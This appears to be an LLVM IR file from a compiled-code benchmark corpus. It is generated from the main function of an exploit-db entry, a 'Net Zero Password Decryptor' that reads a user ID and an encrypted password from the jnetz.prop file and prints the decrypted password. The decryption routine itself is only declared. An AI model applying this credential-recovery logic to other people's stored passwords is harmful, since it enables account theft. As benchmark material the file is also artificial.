; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_20081.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_20081.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_SIZE = common dso_local global i32 0, align 4
@UID_SIZE = common dso_local global i32 0, align 4
@PASS_CIPHER_SIZE = common dso_local global i32 0, align 4
@PASS_PLAIN_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [30 x i8] c"\0ANet Zero Password Decryptor\0A\00", align 1
@.str.1 = private unnamed_addr constant [38 x i8] c"Brian Carrier [bcarrier@atstake.com]\0A\00", align 1
@.str.2 = private unnamed_addr constant [28 x i8] c"@Stake L0pht Research Labs\0A\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"http://www.atstake.com\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"jnetz.prop\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"Unable to find jnetz.prop file\0A\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"ProfUID=\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c"UserID: %s\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"ProfPWD=\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"Encrypted Password: %s\00", align 1
@.str.11 = private unnamed_addr constant [25 x i8] c"Plain Text Password: %s\0A\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"Invalid jnetz.prop file\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %10 = load i32, i32* @BUF_SIZE, align 4
  %11 = zext i32 %10 to i64
  %12 = call i8* @llvm.stacksave()
  store i8* %12, i8** %3, align 8
  %13 = alloca i8, i64 %11, align 16
  store i64 %11, i64* %4, align 8
  %14 = load i32, i32* @UID_SIZE, align 4
  %15 = zext i32 %14 to i64
  %16 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %5, align 8
  %17 = load i32, i32* @PASS_CIPHER_SIZE, align 4
  %18 = zext i32 %17 to i64
  %19 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %6, align 8
  %20 = load i32, i32* @PASS_PLAIN_SIZE, align 4
  %21 = zext i32 %20 to i64
  %22 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %7, align 8
  store i32 2, i32* %8, align 4
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.1, i64 0, i64 0))
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0))
  %27 = call i32* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  store i32* %27, i32** %2, align 8
  %28 = icmp eq i32* %27, null
  br i1 %28, label %29, label %31

29:                                               ; preds = %0
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  store i32 1, i32* %9, align 4
  br label %77

31:                                               ; preds = %0
  br label %32

32:                                               ; preds = %68, %31
  %33 = load i32, i32* @BUF_SIZE, align 4
  %34 = load i32*, i32** %2, align 8
  %35 = call i32* @fgets(i8* %13, i32 %33, i32* %34)
  %36 = icmp ne i32* %35, null
  br i1 %36, label %37, label %40

37:                                               ; preds = %32
  %38 = load i32, i32* %8, align 4
  %39 = icmp sgt i32 %38, 0
  br label %40

40:                                               ; preds = %37, %32
  %41 = phi i1 [ false, %32 ], [ %39, %37 ]
  br i1 %41, label %42, label %69

42:                                               ; preds = %40
  %43 = call i64 @strncmp(i8* %13, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i32 8)
  %44 = icmp eq i64 %43, 0
  br i1 %44, label %45, label %52

45:                                               ; preds = %42
  %46 = load i32, i32* %8, align 4
  %47 = add nsw i32 %46, -1
  store i32 %47, i32* %8, align 4
  %48 = getelementptr inbounds i8, i8* %13, i64 8
  %49 = load i32, i32* @UID_SIZE, align 4
  %50 = call i32 @strncpy(i8* %16, i8* %48, i32 %49)
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0), i8* %16)
  br label %52

52:                                               ; preds = %45, %42
  %53 = call i64 @strncmp(i8* %13, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0), i32 8)
  %54 = icmp eq i64 %53, 0
  br i1 %54, label %55, label %68

55:                                               ; preds = %52
  %56 = load i32, i32* %8, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %8, align 4
  %58 = getelementptr inbounds i8, i8* %13, i64 8
  %59 = load i32, i32* @PASS_CIPHER_SIZE, align 4
  %60 = call i32 @strncpy(i8* %19, i8* %58, i32 %59)
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0), i8* %19)
  %62 = call i64 @nz_decrypt(i8* %19, i8* %22)
  %63 = icmp ne i64 %62, 0
  br i1 %63, label %64, label %65

64:                                               ; preds = %55
  store i32 1, i32* %1, align 4
  store i32 1, i32* %9, align 4
  br label %77

65:                                               ; preds = %55
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.11, i64 0, i64 0), i8* %22)
  br label %67

67:                                               ; preds = %65
  br label %68

68:                                               ; preds = %67, %52
  br label %32

69:                                               ; preds = %40
  %70 = load i32*, i32** %2, align 8
  %71 = call i32 @fclose(i32* %70)
  %72 = load i32, i32* %8, align 4
  %73 = icmp sgt i32 %72, 0
  br i1 %73, label %74, label %76

74:                                               ; preds = %69
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  store i32 1, i32* %9, align 4
  br label %77

76:                                               ; preds = %69
  store i32 0, i32* %1, align 4
  store i32 1, i32* %9, align 4
  br label %77

77:                                               ; preds = %76, %74, %64, %29
  %78 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %78)
  %79 = load i32, i32* %1, align 4
  ret i32 %79
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32* @fgets(i8*, i32, i32*) #2

declare dso_local i64 @strncmp(i8*, i8*, i32) #2

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i64 @nz_decrypt(i8*, i8*) #2

declare dso_local i32 @fclose(i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
